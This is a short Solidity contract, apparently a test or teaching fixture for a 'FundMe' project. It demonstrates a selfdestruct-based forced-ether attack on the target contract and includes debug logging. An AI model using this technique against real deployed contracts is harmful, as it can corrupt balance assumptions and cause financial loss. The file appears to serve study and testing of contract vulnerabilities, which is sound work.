// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "../FundMe.sol";

contract SelfDestructAttack {
    FundMe fundMeContract;

    constructor(address fundMeAddress) {
        fundMeContract = FundMe(payable(fundMeAddress));
        console.log("INSIDE-3");
    }

    // receive() external payable {}

    function initialFunding() public payable {
        console.log("INSIDE-30");
    }

    function withdrawTest() public {
        console.log("INSIDE-4");
        console.log("msg.sender");
        console.log(msg.sender);
        fundMeContract.withdrawSelfdestructFunds();
    }

    function attack() public payable {
        console.log("INSIDE-40");

        // Cast the target contract as payable (even if it isn't, so forcing it to accept funds)
        // and call selfdestruct(address payable recipient)
        // destroying the current contract and sending its funds to the given address
        address payable addr = payable(address(fundMeContract));
        selfdestruct(addr);
    }
}
